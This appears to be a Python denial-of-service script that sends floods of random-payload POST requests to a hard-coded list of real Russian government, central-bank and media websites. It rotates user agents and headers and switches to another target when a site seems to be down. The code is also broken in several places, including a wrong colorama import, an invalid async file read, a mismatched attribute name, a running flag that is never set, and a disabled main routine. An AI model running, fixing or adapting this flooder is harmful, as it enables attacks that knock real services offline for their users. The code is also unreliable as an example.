import asyncio
from sys import argv, exit
from pynput import keyboard
import random
import string
import faster_than_requests as requests
from colorama import init, Front, Back

init()

class Dos:

	option_list = [
	  "www.rt.com",
	  "www.cbr.ru",
	  "www.kremlin.ru",
	  "www.vesti.ru",
	  "www.smotrim.ru",
	  "www.vgtrk.ru",
  	]
	running = False


	def __init__(self, host_number: int, tasks_amount: int):
		self.host = self.option_list[host_number]
		self.tasks_amount = tasks_amount


	async def prepare_headers(self):
		headers = []
		async with open('headers.txt', 'r', encoding='utf-8') as f:
			for line in f.readlines():
				headers.append(tuple(*line.split(':')))
			print(headers)
		self.http_headers = headers


	async def prepare_agents(self):
		agents = []
		async with open('useragent.txt', 'r', encoding='utf-8') as f:
			agents = [line for line in f.readlines()]
		self.agents = agents
			
		
	async def keys_collector(self):
		with keyboard.Listener(
			on_press=self.on_press) as listener:
			listener.join()
		exit()


	async def on_press(self, key):
		if key.char == 'q':
			self.running = False
			return False


	async def generate_payload(self):
		return ''.join(
			random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) 
				for _ in range(random.randint(12,25))
			)


	async def start(self):
		task = asyncio.create_task(self.keys_collector)
		tasks = map(asyncio.create_task, [self.pressure for _ in range(self.tasks_amount)])
		await asyncio.wait(task, return_when=asyncio.FIRST_COMPLETED)
		await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)


	async def pressure(self):
		while self.running:
			data = self.generate_payload()
			response = requests.post(
				self.host,
				data,
				user_agent=random.choice(self.user_agent),
				http_headers=self.http_headers
			)
			if response[2] < 400:
				print(Front.GREEN + f" successfull sended request with payload {len(data) * 8} bytes")
			elif response[2] >= 500:
				print(Front.RED + f" SITE PROBABLY DOWN")
				self.host = random.choice(self.option_list)
			else:
				print(Front.YELLOW + f" technical troubles")
		return True


async def main():
	print(argv)
	# dos = Dos(argv[1], argv[2])
	# await dos.prepare_headers()
	# await dos.prepare_agents()
	# await dos.start()


if __name__ == '__main__':
	asyncio.run(main())
